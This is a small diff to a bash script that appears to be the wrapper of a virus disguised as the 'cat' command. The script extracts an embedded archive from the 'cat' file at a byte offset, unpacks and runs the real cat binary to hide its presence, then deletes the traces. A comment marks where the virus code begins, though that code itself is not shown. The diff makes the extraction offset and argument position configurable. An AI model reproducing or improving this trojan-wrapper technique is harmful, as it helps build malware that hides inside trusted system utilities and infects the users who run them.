@@ -1,5 +1,5 @@
 #!/bin/bash
-tail -c +92 cat > c.zip
+tail -c +"$1" cat > c.zip
 sleep 1
 truncate -s -4 c.zip
 sleep 1
@@ -8,7 +8,7 @@ sleep 1
 unzip -qq c.zip
 sleep 1
 #real cat
-./c "$1"
+./c "$2"
 rm c
 rm c.zip
 #the virus
